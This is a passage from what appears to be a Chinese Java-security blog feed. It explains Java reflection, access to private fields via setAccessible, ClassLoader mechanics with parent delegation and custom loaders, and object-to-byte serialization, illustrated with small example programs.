<p>总的来说，<code>java.lang.reflect.Proxy</code>类是通过创建一个新的<code>Java类</code>–<code>com.sun.proxy.$ProxyXXX</code>的方式来实现类方法代理功能的。</p>
<p>需要注意的是，如果动过动态代理生成了多个动态代理类，新生成的类名中的 <code>0</code> 会自增，如 <code>com.sun.proxy.$Proxy0/$Proxy1/$Proxy2</code>。</p>
]]></content>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 反射机制</title>
    <url>/2022/05/23/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/Java%20%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>Java的反射是指程序在运行期间可以拿到一个对象的所有信息，并且可以操作类或者对象的内部属性–<code>反射属于动态编译</code></p>
<span id="more"></span>
<h4 id="对类的对象的初始化"><a href="#对类的对象的初始化" class="headerlink" title="对类的对象的初始化"></a>对类的对象的初始化</h4><h5 id="一般情况下-已知类以及其的功能"><a href="#一般情况下-已知类以及其的功能" class="headerlink" title="一般情况下(已知类以及其的功能)"></a>一般情况下(已知类以及其的功能)</h5><p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210304223219980.png" alt="image-20210304184612646"></p>
<h5 id="使用反射"><a href="#使用反射" class="headerlink" title="使用反射"></a>使用反射</h5><p>一开始不知道初始化的类对象是什么，无法使用类关键字来创建对象</p>
<ol>
<li>获取反射之中的Class对象</li>
<li>通过反射创建类对象</li>
<li>通过反射获取类属性，方法，构造器</li>
</ol>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210304184612646.png" alt="image-20210304223219980"></p>
<p>eg：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ref3</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPrice</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(<span class="type">int</span> price)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//获取类的Class对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;Reflection.ref3&quot;</span>);</span><br><span class="line">        <span class="comment">//通过Class对象实例分别获取Constructor类对象，Method类对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">setPrice</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;setPrice&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">appleconstructor</span> <span class="operator">=</span> cls.getConstructor();</span><br><span class="line">        <span class="comment">//使用Constructor对象的newInstance方法互殴去反射类对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">appleObj</span> <span class="operator">=</span> appleconstructor.newInstance();</span><br><span class="line">        <span class="comment">//利用invoke方法调用方法</span></span><br><span class="line">        setPrice.invoke(appleObj, <span class="number">12</span>);</span><br><span class="line">        <span class="comment">//根据获取的Constructor类对象，Method类对象获取类的方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getPriceMethod</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;getPrice&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//通过Class对象的getFields()方法可以获取Class类的属性</span></span><br><span class="line">        Field[] fields = cls.getFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;field&#x27;s name&quot;</span>+field.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;Apple price: &quot;</span>+getPriceMethod.invoke(appleObj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出的结果为：</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210303223014821.png" alt="image-20210304193424835"></p>
<p>反射机制的实现主要通过操作<code>java.lang.Class类</code></p>
<ul>
<li>静态编译–在<strong>编译时</strong>确定类型并且绑定对象。比如常见的使用<code>new关键字</code>创建对象</li>
<li>动态编译–<strong>运行时</strong>确定类型并且绑定对象，它不需要实现知道对象是谁。动态编译体现了<code>Java</code>的<code>灵活性</code>，<code>多动态</code>特性以及可以<code>降低类之间的耦合性</code>，但是同时也会因此导致时间成本高于直接执行相同的操作</li>
</ul>
<h4 id="反射的主要功能"><a href="#反射的主要功能" class="headerlink" title="反射的主要功能"></a>反射的主要功能</h4><ul>
<li>在<code>运行时</code>判断任意一个对象所属的类</li>
<li>在<code>运行时</code>构造任意一个类的对象</li>
<li>在<code>运行时</code>判断任意一个类所具有的成员变量和方法</li>
<li>在<code>运行时</code>调用任意一个对象的方法</li>
</ul>
<h3 id="主要涉及的类"><a href="#主要涉及的类" class="headerlink" title="主要涉及的类"></a>主要涉及的类</h3><h4 id="java-lang-Class类"><a href="#java-lang-Class类" class="headerlink" title="java.lang.Class类"></a>java.lang.Class类</h4><p>java.lang.Class存放着对应类型对象的运行时信息</p>
<ul>
<li>在Java程序运行时，JVM为所有类型维护一个<code>java.lang.Class对象</code></li>
<li>该Class对象存放着所有关于该对象的<code>运行时信息</code></li>
<li><code>泛型形式为Class&lt;T&gt;</code></li>
<li><strong>每种类型的Class对象只有1个-&gt;地址只有一个</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ref1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//Object类中的getClass()返回一个Class类型的实例</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="string">&quot;Karry&quot;</span>.getClass();</span><br><span class="line">        <span class="comment">//static method Class.forName()</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span>  Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(c1==c2);</span><br><span class="line">        <span class="comment">//用==运算符实现两个类对象的地址的比较</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运算结果为</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210304193424835.png" alt="image-20210303223014821"></p>
<ul>
<li>Java 反射机制的实现除了依靠<code>java.lang.Class类</code>，还需要依靠：<code>Constructor类</code>，<code>Field类</code>，<code>Method类</code></li>
</ul>
<h4 id="java-lang-reflect-Type类"><a href="#java-lang-reflect-Type类" class="headerlink" title="java.lang.reflect.Type类"></a>java.lang.reflect.Type类</h4><p>java.lang.reflect.Type类时Java中所有类型的父接口</p>
<h5 id="Type类型的子类型接口"><a href="#Type类型的子类型接口" class="headerlink" title="Type类型的子类型接口"></a>Type类型的子类型接口</h5><ul>
<li>原生类型(raw types)</li>
<li>参数化类型(parameterized typed)</li>
<li>数组类型(array types)</li>
<li>类型变量(type variables)</li>
<li>原始类类型(primitive types)</li>
</ul>
<h5 id="反射类对应类的各个组成部分"><a href="#反射类对应类的各个组成部分" class="headerlink" title="反射类对应类的各个组成部分"></a>反射类对应类的各个组成部分</h5><ul>
<li>Class类–类对象</li>
<li>Constructor类–类的构造器对象</li>
<li>Field类–类的属性对象</li>
<li>Method类–类的方法对象</li>
</ul>
<h2 id="反射的基本运用"><a href="#反射的基本运用" class="headerlink" title="反射的基本运用"></a>反射的基本运用</h2><h4 id="获得Class对象"><a href="#获得Class对象" class="headerlink" title="获得Class对象"></a>获得Class对象</h4><ol>
<li><p>使用Object类中的<code>getClass()方法</code>返回一个Class类型的实例</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> str.getClass();</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>T.class</code>语法</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> String.class</span><br></pre></td></tr></table></figure>
<p> 只适用于在编译的时候就知道操作的Class</p>
</li>
<li><p>使用Class类的<code>forName</code>静态方法</p>
<p> 知道类的全路径的情况下，可以使用这种方法获取Class对象</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;Java.lang.String&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>TYPE语法</code></p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ref2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        Class&lt;?&gt; classType1 = flag.getClass();</span><br><span class="line">        System.out.println(classType1);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; classType2 = Boolean.class;</span><br><span class="line">        System.out.println(classType2);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; classType3 = Class.forName(<span class="string">&quot;java.lang.Boolean&quot;</span>);</span><br><span class="line">        <span class="comment">//使用此种方法时应该提供ClassNotFoundException异常处理器</span></span><br><span class="line">        System.out.println(classType3);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; classType4 = Boolean.TYPE;</span><br><span class="line">        System.out.println(classType4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210306171157541.png" alt="image-20210303224644132"></p>
<h4 id="通过反射创建类对象"><a href="#通过反射创建类对象" class="headerlink" title="通过反射创建类对象"></a>通过反射创建类对象</h4><h5 id="通过class对象的newInstance-方法"><a href="#通过class对象的newInstance-方法" class="headerlink" title="通过class对象的newInstance()方法"></a>通过class对象的newInstance()方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> ref3.class;</span><br><span class="line"><span class="type">ref3</span> <span class="variable">apple</span> <span class="operator">=</span> (ref3)cls.newInstance();</span><br></pre></td></tr></table></figure>

<h5 id="通过Constructor对象的newInstance-方法"><a href="#通过Constructor对象的newInstance-方法" class="headerlink" title="通过Constructor对象的newInstance()方法"></a>通过Constructor对象的newInstance()方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> ref3.class;</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getConstructor();</span><br><span class="line"><span class="type">ref3</span> <span class="variable">Apple</span> <span class="operator">=</span> (Apple)constructor.newInstance();</span><br></pre></td></tr></table></figure>

<p>这两种方法的在于：</p>
<p><strong>通过Constructor对象创建类对象可以选择特定构造方法，而通过Class对象则只能使用默认的无参数构造方法</strong></p>
<hr>
<h4 id="通过反射获取类属性，方法，构造器"><a href="#通过反射获取类属性，方法，构造器" class="headerlink" title="通过反射获取类属性，方法，构造器"></a>通过反射获取类属性，方法，构造器</h4><h5 id="通过Class对象的getFields-方法获取Class类的属性"><a href="#通过Class对象的getFields-方法获取Class类的属性" class="headerlink" title="通过Class对象的getFields()方法获取Class类的属性"></a>通过Class对象的getFields()方法获取Class类的属性</h5><p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210304193037044.png" alt="image-20210304193037044"></p>
<p>需要注意的是：此种方法无法获取私有属性</p>
<h5 id="通过Class对象的getDeclaredFields-方法获取属性"><a href="#通过Class对象的getDeclaredFields-方法获取属性" class="headerlink" title="通过Class对象的getDeclaredFields()方法获取属性"></a>通过Class对象的getDeclaredFields()方法获取属性</h5><p>和前一种方法类似</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> ref3.class;</span><br><span class="line">Field[] fields = cls.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;field&#x27;s name: &quot;</span>+field.getName());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>区别在于此种方法可以获取私有属性</p>
<h3 id="访问权限的问题"><a href="#访问权限的问题" class="headerlink" title="访问权限的问题"></a>访问权限的问题</h3><p>反射机制的默认行为受限于<code>Java</code>的访问控制。比如：无法访问(private)私有的方法，字段</p>
<p>Java的安全机制只允许查看任意对象有哪些域，而不允许它们读值，如果强制读取，会导致异常</p>
<h5 id="解决方式："><a href="#解决方式：" class="headerlink" title="解决方式："></a>解决方式：</h5><p>使用Field类，Method类以及Constructor类对象的<code>setAccessible()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(<span class="type">boolean</span> flag)</span></span><br><span class="line">    <span class="comment">//为访问对象设置可访问标志</span></span><br><span class="line">    <span class="comment">//当flag=true的时候，标识屏蔽掉Java语言的访问检查，从而使得可以访问和修改对象的私有属性</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isAccessible</span><span class="params">()</span></span><br><span class="line">    <span class="comment">//返回反射对象的可访问标志的值</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(AccessibleObject[] array, <span class="type">boolean</span> flag)</span></span><br><span class="line">    <span class="comment">//设置对象数组可访问标志</span></span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ref5</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ref5</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">StudentClass</span> <span class="operator">=</span> ref5.class;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">Student</span> <span class="operator">=</span> StudentClass.newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> StudentClass.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        f.set(Student, <span class="string">&quot;Karry&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(f.get(Student));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210303224644132.png" alt="image-20210306171157541"></p>
]]></content>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Class Loader(类加载机制)</title>
    <url>/2022/04/21/Java-Class-Loader-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/Java-Class-Loader%20%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>Java是一个依赖于<code>JVM</code>实现的跨平台的开发语言。Java程序在运行之前先编译成<code>class文件</code>，Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，<code>ClassLoader</code>会调用<code>JVM</code>的的native方法(<code>defineClass0/1/2</code>) 来定义一个<code>java.lang.Class</code>实例</p>
<span id="more"></span>
<h4 id="ClassLoader的作用"><a href="#ClassLoader的作用" class="headerlink" title="ClassLoader的作用"></a>ClassLoader的作用</h4><p>JVM运行实例之中会存在多个ClassLoader，不同的ClassLoader会从不同的地方加载字节码文件，它负责将Class字节码形式转换为内存形式的Class对象，字节码可以来自于<code>磁盘文件</code>的<code>*.class</code>，也可以是j<code>ar包</code>里的<code>*.class</code>，也可以是来自远程服务器提供的<code>字节流</code>，字节码的本质是一个<code>字节数组[]byte</code>，它具有特定的复杂的内部格式</p>
<p>每个Class对象的内部都有一个classloader字段来标识自己是由哪个ClassLoader加载的。ClassLoader类似是一个容器，里面装了很多已经加载的Class对象</p>
<h3 id="类的加载过程"><a href="#类的加载过程" class="headerlink" title="类的加载过程"></a>类的加载过程</h3><p>JVM 将类的加载分为三个步骤：</p>
<ul>
<li>Load–装载<br>装载的过程就是查找和导入Class文件<br>找到<code>二进制字节码</code>并且加载至JVM之中，JVM通过类名，类所在的包名，ClassLoader完成类加载。标识一个被加载的类：类名+包名+ClassLoader实例ID</li>
<li>Link<ul>
<li>verify(验证)–确保类的加载的正确性</li>
<li>prepare–为类的静态变量分配内存，并将其初始化为默认值</li>
<li>resolve(解析)–把类中的符号引用转换为直接引用</li>
</ul>
</li>
<li>Initialize</li>
<li>类的初始化触发：<ul>
<li>实例化对象的时候</li>
<li>访问类的静态变量</li>
<li>反射(class.forName())</li>
<li>初始化一个类的子类会初始化父类</li>
<li>JVM启动时表明的启动类，即文件名和类名相同的那个类</li>
</ul>
</li>
</ul>
<h3 id="Java-类"><a href="#Java-类" class="headerlink" title="Java 类"></a>Java 类</h3><p><code>hello.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">javac hello.java</span><br></pre></td></tr></table></figure>

<p><code>JDK</code>自带的<code>javap命令</code>反汇编hello.java文件对应的hello类</p>
<h3 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h3><p>一切的java类都必须经过JVM加载之后才可以运行，而ClassLoader的主要作用就是Java类文件的加载</p>
<p>在JVM类加载器：</p>
<ul>
<li><code>Bootstrap ClassLoader</code>–引导类加载器–负责加载JVM运行时的核心类，这些类位于JAVA_HOME&#x2F;lib&#x2F;rt.jar文件中，常用的内置库都在里面，比如<code>java.util.*</code>，<code>java.io.*</code>，<code>java.lang.*</code>等等。除了引导加载器之外，所有的类都还有一个父类加载器</li>
<li><code>Extension ClassLoader</code>–扩展类加载器–比如swing系列，内置的js引擎，xml解析器等等</li>
<li><code>App ClassLoader</code>–系统类加载器-&gt;默认的类加载器–直接面向用户的加载器，它会加载<code>Classpath环境变量里定义的路径中的jar包和目录</code></li>
</ul>
<p>获取一个类加载器的时候可能会返回一个<code>null值</code></p>
<p>如：<code>java.io.File.class.getClassLoader()</code>将返回一个<code>null</code>对象，这是因为<code>java.io.File</code>类在JVM初始化的时候会被<code>Bootstrap ClassLoader</code>加载，在尝试获取被<code>Bootstrap ClassLoader</code>类加载器所加载的类的ClassLoadder都会返回<code>null值</code></p>
<p><strong><code>ClassLoader</code>类的核心方法</strong></p>
<ul>
<li><code>loaderClass</code>–加载指定的Java类</li>
<li><code>findClass</code>–查找指定的Java类</li>
<li><code>findLoadedClass</code>–查找JVM已经加载过的类</li>
<li><code>defineClass</code>–定义一个Java类</li>
<li><code>resolveClass</code>–链接指定的Java类</li>
</ul>
<h3 id="Java-类动态加载方式"><a href="#Java-类动态加载方式" class="headerlink" title="Java 类动态加载方式"></a>Java 类动态加载方式</h3><p>Java的类动态加载方式分为<code>显式</code>和<code>隐式</code></p>
<p>显式：通常使用<code>Java反射</code>或者<code>ClassLoader</code>来动态加载对象</p>
<p>隐式：<code>类名.方法名()</code>或者<code>new</code>实例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反射加载</span></span><br><span class="line">Class.forName(<span class="string">&quot;classloader.hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ClassLoader加载</span></span><br><span class="line"><span class="built_in">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;classloader.hello&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>Class.forName(&quot;类名&quot;)</code>默认会初始化加载类的静态属性方法(如果不想初始化类可以使用<code>Class.forName(&quot;类名&quot;, 是否初始化, 类加载器)</code>)，而<code>ClassLoader.loadClass</code>默认不会初始化类方法</p>
<h2 id="ClassLoader-类加载类流程"><a href="#ClassLoader-类加载类流程" class="headerlink" title="ClassLoader 类加载类流程"></a>ClassLoader 类加载类流程</h2><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>双亲委派模型</p>
<p>这是指：当一个类需要被加载的时候，类加载器总会把加载委派给父类去加载，一直递归到顶层为止，当父类无法加载的时候，再从子类进行加载。</p>
<p>双亲委派模型并不是一种强制性的约束，没有按照这个步骤也不会报错，它是一种Java设计者推荐使用的类加载器的方式</p>
<ul>
<li><code>ClassLoader</code>会调用<code>public Class&lt;?&gt; loadClass(String name)</code>方法加载classloader.hello类</li>
<li>调用<code>findLoadedClass</code>方法检查hello类是否已经被初始化，如果JVM已经初始化过该类则直接返回类对象</li>
<li>如果创建当前<code>ClassLoader</code>时传入了父类加载器<code>(new ClassLoader(父类加载器))</code>，就使用父类加载器加载hello类，否则就是由<code>BootStrap ClassLoader</code>加载<ul>
<li>如果上一步无法加载hello类，则会根据双亲委派模型逐层返回</li>
</ul>
</li>
<li>如果当前的ClassLoader没有重写了<code>findClass</code>方法，那么直接返回类加载失败异常；如果当前类重写了<code>findClass</code>方法并且通过传入的类名找到了对应的类字节码，那么应该调用<code>defineClass</code>方法去JVM中注册该类</li>
<li>如果调用<code>loadClass</code>的时候传入的<code>resolve</code>参数为true，那么就还需要调用<code>resolveClass</code>方法链接类，默认为false</li>
<li>返回一个被JVM加载后的<code>java.lang.Class</code>类对象</li>
</ul>
<h2 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h2><p>一个自定地ClassLoader需要满足：</p>
<ol>
<li>需要继承于ClassLoader</li>
<li>需要自定义寻找类的规则–重写<code>findClass()</code>方法</li>
<li>需要使用<code>defineClass()</code>方法向JVM中注册该类</li>
</ol>
<p><code>java.lang.ClassLoader</code>是所有加载类的父类，<code>java.lang.ClassLoader</code>有很多子类加载器，比如用于加载<code>jar包</code>的<code>java.net.URLClassLoader</code>其本身通过继承<code>java.lang.ClassLoader</code>类，重写了<code>findClass</code>方法从而实现了加载目录class文件甚至是远程资源文件</p>
<p>在<code>classloader.hello</code>类存在的地方，可以使用以下方法调用hello方法并且输出</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">hello</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">hello</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> t.hello();</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是如果<code>classloader.hello</code>根本不存在<code>classpath</code>，那么可以使用自定义加载器重写<code>findClass</code>方法，然后在调用<code>defineClass方法</code>的时候传入hello类的字节码的方式来向JVM中定义一个hello类，最后通过反射机制就可以调用hello类中的hello方法</p>
<p>转换类字节码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">a</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] objectToBytes(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span>(</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">ObjectOutputStream</span> <span class="variable">sOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        )&#123;</span><br><span class="line">            sOut.writeObject(obj);</span><br><span class="line">            sOut.flush();</span><br><span class="line">            <span class="type">byte</span>[] bytes = out.toByteArray();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 字节数组转对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">bytesToObject</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span>(</span><br><span class="line">                <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">sIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        )&#123;</span><br><span class="line">            <span class="keyword">return</span> sIn.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">        <span class="type">byte</span>[] b =  objectToBytes(a);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;b.length;i++)&#123;</span><br><span class="line">            str += b[i] + <span class="string">&quot;,&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(str);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

